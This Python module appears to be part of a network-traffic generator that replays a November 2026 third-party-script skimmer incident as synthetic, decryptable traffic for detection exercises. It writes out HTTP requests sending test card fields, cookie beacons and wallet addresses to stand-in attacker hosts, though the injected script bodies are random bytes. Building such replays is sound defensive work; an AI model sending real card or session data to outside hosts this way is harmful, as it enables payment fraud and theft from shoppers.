"""netgen.optimjack_skimmer -- the "OPTIMJACK third-party-script web skimmer" incident-replay scenario.

A replay of the November 2026 supply-chain incident in which an experimentation platform's CDN served
attacker-modified project JavaScript to the visitors of ~178 organizations for a window: a card
skimmer, a crypto-wallet clipper, a cookie/screenshot harvester and a device-targeted loader, rebuilt
dozens of times during the window (reported).

What a sensor sees (real, key-logged TLS sessions -- decryptable with the capture's key log):
  * normal page views of a retail site: DNS, TLS to the site, TLS to the experimentation CDN, a ~38 KB
    project script;
  * from the injection instant the SAME script URL returns a larger, ever-changing body (a different size
    on each rebuild), and the visitors' browsers start making requests they never made before -- first-seen
    DNS names, new TLS servers with just-issued certificates, JSON POSTs carrying card-shaped fields,
    cookie/telemetry GET beacons with long query strings, and a small POST to a wallet-clipper endpoint;
  * after the cleanup instant the script is back to its normal size and the extra requests stop.

Registered as ``ir-optimjack-supplychain`` (category IR), a SIBLING of the other IR replays.

PIN-SAFE: hosts are injected inside ``build()``; a build that does not select this scenario is
byte-for-byte the baseline.
"""
import json
import os

from netgen import flows as F
from netgen import protocols as P
from netgen.identity import H
from netgen import packkit as K

from netgen.netscaler import phases as NSP

rng = NSP.rng

_EXTERNAL = {
    "site": ("www.brightcart-store.example", "198.51.100.144", 8),
    "cdn": ("cdn.exp-platform.example", "198.51.100.145", 7),
    "skim": ("static-metrics-cdn.example", "192.0.2.144", 14),        # skimmer + cookie harvester
    "wallet": ("wallet-sync-cdn.example", "192.0.2.145", 13),         # clipper + loader endpoint
}
_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
       "Chrome/131.0.0.0 Safari/537.36")
_TEST_PANS = ("4111111111111111", "5555555555554444", "378282246310005", "6011111111111117")
_PROJECT = "27184936"


def _inject_hosts(ctx):
    return K.add_externals(ctx, "_optj_ext", _EXTERNAL, rng)


def _get(host, path, referer=None, extra=None):
    h = ["GET %s HTTP/1.1" % path, "Host: " + host, "User-Agent: " + _UA, "Accept: */*", "Accept-Language: en-US,en;q=0.9"]
    if referer:
        h.append("Referer: " + referer)
    return ("\r\n".join(h + (extra or [])) + "\r\n\r\n").encode()


def _post(host, path, body, ctype, referer):
    h = ["POST %s HTTP/1.1" % path, "Host: " + host, "User-Agent: " + _UA, "Content-Type: " + ctype,
         "Content-Length: %d" % len(body), "Origin: https://www.brightcart-store.example", "Referer: " + referer, "Accept: */*"]
    return ("\r\n".join(h) + "\r\n\r\n").encode() + body


def _js(n, ts):
    body = (b"/*! experimentation-snippet v4 */\n(function(){var w=window;" + os.urandom(max(0, n)).hex().encode()[:max(0, n - 80)])
    return P.http_response("200 OK", body, "application/javascript", ts, server="nginx",
                           headers=["Cache-Control: public, max-age=120", "Access-Control-Allow-Origin: *"])


def page_view(ctx, user, ext, infected, version, ts=None):
    """One shopper's page view: the site page, then the experimentation project script. Infected views get
    the larger rebuilt script (size depends on the payload version) and the visitor's browser then talks to
    the skimmer / wallet infrastructure."""
    site, cdn = ext["site"], ext["cdn"]
    path = "/product/%d" % rng.randint(1000, 9999)
    ref = "https://%s%s" % (site.fqdn, path)
    html = P.http_response("200 OK", P.text_blob(rng.randint(28000, 90000)), "text/html; charset=utf-8", ts, server="nginx",
                           headers=["Set-Cookie: sid=%s; Path=/; Secure; HttpOnly" % os.urandom(12).hex()])
    out = [K.tls_exchange(ctx, user, site.fqdn, site, ts, [(_get(site.fqdn, path), html)])]
    t = ts + rng.uniform(0.4, 1.2)
    size = rng.randint(36000, 40000) if not infected else 52000 + (version * 733) % 9000
    out.append(K.tls_exchange(ctx, user, cdn.fqdn, cdn, t, [(_get(cdn.fqdn, "/js/%s.js" % _PROJECT, ref), _js(size, t))]))
    if infected:
        skim, wallet = ext["skim"], ext["wallet"]
        t += rng.uniform(0.8, 2.0)
        q = "&".join("%s=%s" % (k, os.urandom(rng.randint(6, 14)).hex()) for k in ("c", "s", "u", "v"))
        out.append(K.tls_exchange(ctx, user, skim.fqdn, skim, t, [
            (_get(skim.fqdn, "/px.gif?" + q, ref), P.http_response("200 OK", b"GIF89a\x01\x00\x01\x00", "image/gif", t, server="nginx"))]))
        if rng.random() < 0.55:       # a checkout: the skimmed card fields leave with the order
            t += rng.uniform(5, 40)
            card = json.dumps({"n": rng.choice(_TEST_PANS), "e": "%02d/%d" % (rng.randint(1, 12), rng.randint(27, 31)),
                               "c": "%03d" % rng.randint(0, 999), "h": "TEST CARDHOLDER", "z": "%05d" % rng.randint(10000, 99999),
                               "u": ref, "t": int(t)}, separators=(",", ":")).encode()
            out.append(K.tls_exchange(ctx, user, skim.fqdn, skim, t, [
                (_post(skim.fqdn, "/api/v2/collect", card, "application/json", ref),
                 P.http_response("200 OK", b'{"ok":1}', "application/json", t, server="nginx"))], dns=False))
        if rng.random() < 0.25:       # wallet-address clipper + device loader endpoint
            t += rng.uniform(1, 6)
            out.append(K.tls_exchange(ctx, user, wallet.fqdn, wallet, t, [
                (_get(wallet.fqdn, "/l/%s.js" % os.urandom(4).hex(), ref),
                 P.http_response("200 OK", os.urandom(rng.randint(1800, 5200)), "application/javascript", t, server="nginx")),
                (_post(wallet.fqdn, "/w", b'{"a":"bc1q%s"}' % os.urandom(19).hex().encode(), "application/json", ref),
                 P.http_response("200 OK", b'{"r":"%s"}' % os.urandom(10).hex().encode(), "application/json", t, server="nginx"))]))
    return F.merged(*out)


def build(ctx, eng, tag, win):
    """Schedule the OPTIMJACK incident across the window: a clean stretch, the infected stretch (a different
    script build every few minutes), then a clean stretch again -- the same visitors throughout."""
    ext = _inject_hosts(ctx)
    from netgen import incidents as INC
    s = INC.sched_factory(eng, ctx, tag, win)
    lo, hi = win
    scale = max(0.01, min(1.0, getattr(ctx, "scale", 1.0)))
    users = sorted((h for h in ctx.h.values() if h.name.startswith(H("WS")) and h.name != H("WS-047")), key=lambda h: h.name)
    t_inf, t_end = lo + (hi - lo) * 0.25, lo + (hi - lo) * 0.75
    n_views = max(40, int(round(160 * scale)) + 40)
    for i in range(n_views):
        t = lo + 30 + (hi - lo - 90) * (i / float(n_views)) + rng.uniform(-5, 5)
        version = int((t - t_inf) / 240.0) + 1
        s(t, page_view, users[i % len(users)], ext, t_inf <= t < t_end, version)
